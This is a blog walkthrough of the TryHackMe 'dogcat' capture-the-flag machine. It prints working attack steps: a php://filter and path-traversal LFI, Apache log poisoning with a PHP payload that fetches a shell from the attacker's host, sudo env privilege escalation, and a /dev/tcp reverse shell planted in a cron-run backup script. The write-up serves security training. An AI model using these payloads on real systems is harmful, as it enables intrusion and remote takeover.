---
published: true
---
![](https://raw.githubusercontent.com/0xsheinn/0xsheinn.github.io/master/_posts/images/DogCat/1.png)

Hello guys , This is one of the machine in [tryhackme](https://tryhackme.com/).Name is [dogcat](https://tryhackme.com/room/dogcat).

# [](#header-2)Nmap Scan

```
# Nmap 7.80 scan initiated Wed Jun 24 04:45:35 2020 as: nmap -sC -sV -T4 -A -oN /root/Desktop/TryHackMe/DogCat/namp 10.10.142.7
Nmap scan report for 10.10.142.7
Host is up (0.32s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA)
|   256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA)
|_  256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: dogcat
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=6/24%OT=22%CT=1%CU=30208%PV=Y%DS=2%DC=T%G=Y%TM=5EF312D
OS:A%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M508ST11NW6%O2=M508ST11NW6%O3=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST1
OS:1NW6%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN
OS:(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   349.40 ms 10.8.0.1
2   349.58 ms 10.10.142.7

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jun 24 04:46:19 2020 -- 1 IP address (1 host up) scanned in 44.20 seconds

```

Port 80 http is opening.Let's check it :)

# [](#header-2)Web Page

![](https://raw.githubusercontent.com/0xsheinn/0xsheinn.github.io/master/_posts/images/DogCat/2.png)

# [](#header-2)Directory Scan

```
root@cyb3rhoL1c:~/Desktop/TryHackMe/DogCat# gobuster dir -u http://dogcat.thm/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -q -t 45 -x php,html,txt
/index.php (Status: 200)
/cat.php (Status: 200)
/flag.php (Status: 200)
/cats (Status: 301)
/dogs (Status: 301)
/dog.php (Status: 200)
```
we got flag.php

and there is also a parameter, I'm added `?view=flag` but it's only print `Sorry, only dogs or cats are allowed. `
Let use `php://filter/convert.base64-encode/dog/resource=`

![](https://raw.githubusercontent.com/0xsheinn/0xsheinn.github.io/master/_posts/images/DogCat/5.png)

we got base64, let's decode it

```
root@cyb3rhoL1c:~/Desktop/TryHackMe/DogCat# echo "PD9waHAKJGZsYWdfMSA9IC***********YXRkb2dfYWI2N2VkZmF9Igo/Pgo=" | base64 -d
<?php
$flag_1 = "THM{Th1s_1s_*******_ab67edfa}"
?>

```

and we got flag1 ,after some enumerating on LFI ,i'm got /etc/passwd with this

`?view=dog/../../../../../../../etc/passwd&ext=`

![](https://raw.githubusercontent.com/0xsheinn/0xsheinn.github.io/master/_posts/images/DogCat/6.png)

now we can do log poisoning with LFI, you can read about that here [Apache Log Poisoning through LFI](https://www.hackingarticles.in/apache-log-poisoning-through-lfi/)

`?view=dog/../../../../../../../var/log/apache2/access.log&ext=`

![](https://raw.githubusercontent.com/0xsheinn/0xsheinn.github.io/master/_posts/images/DogCat/7.png)

I'm used burpsuit to upload shell 

Before you intercept , Create python server in your shell folder 

```
root@cyb3rhoL1c:~/Desktop/TryHackMe/DogCat# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```

![](https://raw.githubusercontent.com/0xsheinn/0xsheinn.github.io/master/_posts/images/DogCat/8.png)

and put this payload after user-agent:

`<?php file_put_contents('yourshell.php', file_get_contents('http://10.8.69.162/yourshell.php'))?>`

![](https://raw.githubusercontent.com/0xsheinn/0xsheinn.github.io/master/_posts/images/DogCat/10.png)

![](https://raw.githubusercontent.com/0xsheinn/0xsheinn.github.io/master/_posts/images/DogCat/11.png)

```
root@cyb3rhoL1c:~# nc -nvlp 1337
listening on [any] 1337 ...
connect to [10.8.69.162] from (UNKNOWN) [10.10.38.194] 58370
Linux 07a3b42783b3 4.15.0-96-generic #97-Ubuntu SMP Wed Apr 1 03:25:46 UTC 2020 x86_64 GNU/Linux
 14:21:52 up  1:04,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$   

```
Let's check `sudo -l` 

```
$ sudo -l
Matching Defaults entries for www-data on 07a3b42783b3:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on 07a3b42783b3:
    (root) NOPASSWD: /usr/bin/env
$ 

```
Run `sudo env /bin/bash -i ` to get root shell and

You can find this command on this site [GTFObin](https://gtfobins.github.io/) 

```
$ sudo env /bin/bash -i
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@07a3b42783b3:/# 

```

type `ls` command and you will see flag3

```
root@07a3b42783b3:~# ls
ls
flag3.txt
root@07a3b42783b3:~# cat flag3.txt
cat flag3.txt
THM{D1ff3r3nt_**************_874112}
root@07a3b42783b3:~# 
```


I also tried this command to find all the flag 

`find / -type f -name flag 2>/dev/null`

but there is nothing to see

Ater searching for a while I found flag2 in this folder `/var/www`

```
root@07a3b42783b3:/var/www# ls
ls
flag2_QMW7JvaY2LvK.txt
html
root@07a3b42783b3:/var/www# cat flag2_QMW7JvaY2LvK.txt
cat flag2_QMW7JvaY2LvK.txt
THM{LF1_t0_RC3_aec3fb}
root@07a3b42783b3:/var/www# 

```

And then I found `backup.sh` in /opt/backups folder 

```
root@07a3b42783b3:/# cd /opt/backups
cd /opt/backups
root@07a3b42783b3:/opt/backups# ls
ls
backup.sh
backup.tar
root@07a3b42783b3:/opt/backups# cat backup.sh
cat backup.sh
#!/bin/bash
tar cf /root/container/backup/backup.tar /root/container
root@07a3b42783b3:/opt/backups# 

```
Script name is backup

I think this script may be in cronjob ,you can read about cronjob here [cronjob](https://en.wikipedia.org/wiki/Cron)

So I added this command in this script and listening with port 1234 

`echo 'bash -i >& /dev/tcp/10.8.69.162/1234 0>&1' >> backup.sh`

```
root@07a3b42783b3:/opt/backups# echo 'bash -i >& /dev/tcp/10.8.69.162/1234 0>&1' >> backup.sh
 >> backup.sh >& /dev/tcp/10.8.69.162/1234 0>&1' 
root@07a3b42783b3:/opt/backups# 

```

After about 3 second I got root shell as dogcat 

```
root@cyb3rhoL1c:~# nc -nvlp 1234
listening on [any] 1234 ...
connect to [10.8.69.162] from (UNKNOWN) [10.10.38.194] 37118
bash: cannot set terminal process group (5618): Inappropriate ioctl for device
bash: no job control in this shell
root@dogcat:~# 

```

Run `ls` command and you will see flag 4

```
root@dogcat:~# ls           
ls
container
flag4.txt
root@dogcat:~# cat flag4.txt           
cat flag4.txt
THM{esc4l4tions_on_************************52b17dba6ebb0dc38bc1049bcba02d}
root@dogcat:~# 
```

You can run this command `crontab -l` to know what script is working as cronjob

```
root@dogcat:/var# crontab -l
crontab -l
# Edit this file to introduce tasks to be run by cron.
# 
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
# 
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').# 
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
# 
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).
# 
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
# 
# For more information see the manual pages of crontab(5) and cron(8)
# 
# m h  dom mon dow   command
* * * * * /root/container/backup/backup.sh
@reboot /root/container/launch.sh

root@dogcat:/var# 

```

![](https://raw.githubusercontent.com/0xsheinn/0xsheinn.github.io/master/_posts/images/DogCat/Screenshot_2020-06-24_06-00-02.png)

[Enjoy :)]()
